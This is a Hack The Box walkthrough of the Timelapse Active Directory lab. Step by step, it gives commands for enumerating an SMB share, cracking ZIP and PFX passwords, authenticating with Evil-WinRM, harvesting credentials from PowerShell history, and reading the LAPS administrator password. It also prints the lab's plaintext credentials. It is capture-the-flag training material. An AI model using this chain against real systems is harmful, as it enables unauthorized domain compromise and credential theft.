# Timelapse HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Timelapse-green?logo=hackthebox)](https://app.hackthebox.com/machines/452)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

This walkthrough covers the **Timelapse** Hack The Box (HTB) lab, which focuses on exploiting a Windows Active Directory environment using enumeration, password cracking, and privilege escalation techniques. The main attack path involves:

- Discovering a publicly accessible SMB share,
- Extracting a password-protected ZIP file containing a PFX certificate,
- Cracking the ZIP and PFX passwords using John the Ripper,
- Extracting an SSL certificate and private key from the PFX file,
- Using the certificate and key to authenticate via WinRM,
- Performing PowerShell history enumeration to find new credentials,
- Exploiting LAPS (Local Administrator Password Solution) permissions to fetch the Administrator password, 
- Gaining Administrator access on the domain controller.

---

## Table of Contents

- [Recon and Port Scanning](#recon-and-port-scanning)  
- [Enumerating SMB Shares](#enumerating-smb-shares)  
- [Cracking ZIP Password](#cracking-zip-password)  
- [Extracting PFX File](#extracting-pfx-file)  
- [Cracking PFX Password](#cracking-pfx-password)  
- [Extracting SSL Certificate and Private Key](#extracting-ssl-certificate-and-private-key)  
- [Authentication via WinRM with Evil-WinRM](#authentication-via-winrm-with-evil-winrm)  
- [PowerShell History Enumeration](#powershell-history-enumeration)  
- [Login with `svc_deploy` User](#login-with-svc_deploy-user)  
- [LAPS Password Extraction](#laps-password-extraction)  
- [Administrator Access](#administrator-access)
- [Stepwise PoC](#stepwise-poc)

---

## Recon and Port Scanning

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.227.113 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -SC -sv 10.129.227.113
```
- Perform full port scan and scan only open ports with service detection.

---

## Enumerating SMB Shares
```
smbclient -L //10.129.227.113/
smbclient //10.129.227.113/Shares
```
- List SMB shares, then connect to the "Shares" share.

Within the SMB client:

```
ls
cd Dev
get winrm_backup.zip
```
- List files in the share, navigate to Dev folder, and download the `winrm_backup.zip`.

---

## Cracking ZIP Password

```
zip2john winrm_backup.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
```
- Convert ZIP to John-compatible hash and crack password using rockyou.txt wordlist.

---

## Extracting PFX File

`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes`
- Attempt to extract private key (initially fails due to unknown password).

---

## Cracking PFX Password

```
python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
```
- Convert PFX to a hash and crack password using John the Ripper.

---

## Extracting SSL Certificate and Private Key

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```
- Extract the private key (unencrypted) and the SSL certificate separately now that the password is known.

---

## Authentication via WinRM with Evil-WinRM

`evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S`
- Authenticate to the WinRM SSL service using the extracted cert and private key, skipping SSL certificate verification.

---

## PowerShell History Enumeration

`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- View PowerShell command history retrieved to discover new credentials.

---

## Login with `svc_deploy` User

```
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
```
- Login as `svc_deploy` using found credentials and check the group memberships.

---

## LAPS Password Extraction

`Get-ADComputer DC01 -property 'ms-mcs-admpwd'`
- Retrieve the current local Administrator password for DC01 computer managed by LAPS.

---

## Administrator Access

`evil-winrm -i 10.129.227.113 -u administrator -p '72)9j8++KMk(38d9sAgO+k9N' -S`
- Use the retrieved LAPS-managed password to login as Administrator and gain full access.

---

## 11. Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>

<img width="1562" height="771" alt="16" src="https://github.com/user-attachments/assets/23242ca2-2135-4182-8ee8-585bceb4ef20" />
<img width="1063" height="472" alt="15" src="https://github.com/user-attachments/assets/6bc962ed-6c09-468b-aef7-da2ad1dbb0b8" />
<img width="1382" height="621" alt="14" src="https://github.com/user-attachments/assets/51e4965f-81c2-496a-8234-5c49d0d81db9" />
<img width="714" height="158" alt="13" src="https://github.com/user-attachments/assets/df8d4c1c-40ea-4b83-bf40-c359e7dad25d" />
<img width="1764" height="136" alt="12" src="https://github.com/user-attachments/assets/339768f1-f2c0-4c59-84fa-067dd675359f" />
<img width="1176" height="305" alt="11" src="https://github.com/user-attachments/assets/509a38cf-4317-4d55-960a-fb0a397aa519" />
<img width="700" height="161" alt="10" src="https://github.com/user-attachments/assets/1d44985b-2cbb-47aa-b475-80333c96e0b2" />
<img width="601" height="462" alt="9" src="https://github.com/user-attachments/assets/5179b939-0145-4429-9850-7322eb29377d" />
<img width="997" height="123" alt="8" src="https://github.com/user-attachments/assets/0cdd6f1e-e9df-4696-b898-e840e59ba0be" />
<img width="1189" height="446" alt="7" src="https://github.com/user-attachments/assets/ee2ce62d-fe37-4248-93f0-2c715e383bda" />
<img width="1654" height="639" alt="6" src="https://github.com/user-attachments/assets/aedc1e74-0501-4e59-be10-55610b2bb0ac" />
<img width="1507" height="686" alt="5" src="https://github.com/user-attachments/assets/98692e63-4bd7-4943-be3a-e94ce8c9cbe7" />
<img width="1616" height="458" alt="4" src="https://github.com/user-attachments/assets/3b51cd00-12b6-4b70-8f10-e70cf7403ae8" />
<img width="1188" height="132" alt="3" src="https://github.com/user-attachments/assets/d8237c09-1487-4799-9a4a-f11d027e15fc" />
<img width="1117" height="428" alt="2" src="https://github.com/user-attachments/assets/1669ab7c-2d28-4b63-a5e2-d45c855957e8" />
<img width="1629" height="463" alt="1" src="https://github.com/user-attachments/assets/8e89bfd9-75e9-44d5-aad2-4e45dcda0326" />

</details>  

---

## Tools Utilized

- **John the Ripper**: For cracking ZIP and PFX passwords.
- **OpenSSL**: To extract certificates and keys from PFX files.
- **Evil-WinRM**: For remote Windows management via PowerShell and WinRM.

---

**Note:** 

-  The `.pfx` file contains cryptographic assets (SSL certificate + private key) for authentication.
-  LAPS (Local Administrator Password Solution) securely manages local account passwords of domain-joined computers and stores them in Active Directory.

---
